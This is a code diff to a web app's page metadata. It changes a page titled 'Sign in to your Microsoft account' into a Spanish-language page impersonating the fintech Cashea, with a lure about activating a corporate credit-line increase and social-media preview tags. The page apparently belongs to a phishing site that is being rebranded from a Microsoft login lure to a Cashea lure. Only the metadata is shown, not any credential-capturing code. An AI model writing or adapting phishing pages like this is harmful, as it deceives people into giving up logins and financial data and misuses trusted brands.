@@ -13,10 +13,28 @@ const geistMono = Geist_Mono({
 });
 
 export const metadata: Metadata = {
-  title: "Sign in to your Microsoft account",
-  description: "Login page for Microsoft services",
+  title: "Cashea - Verificación de Cuenta",
+  description: "Activa tu aumento de cupo corporativo y disfruta de tus beneficios. Proceso seguro y verificado.",
+  openGraph: {
+    title: "Cashea: Beneficio Corporativo Disprocar",
+    description: "Inicia sesión para activar tu incremento de línea de crédito.",
+    images: [
+      {
+        url: "/logo.png",
+        width: 800,
+        height: 600,
+        alt: "Cashea Logo",
+      },
+    ],
+    type: "website",
+  },
   icons: {
-    icon: "/microsoft-logo.svg",
+    icon: [
+      { url: "/logo.png" },
+      { url: "/logo.png", sizes: "32x32", type: "image/png" },
+    ],
+    shortcut: "/logo.png",
+    apple: "/logo.png",
   },
 };
 
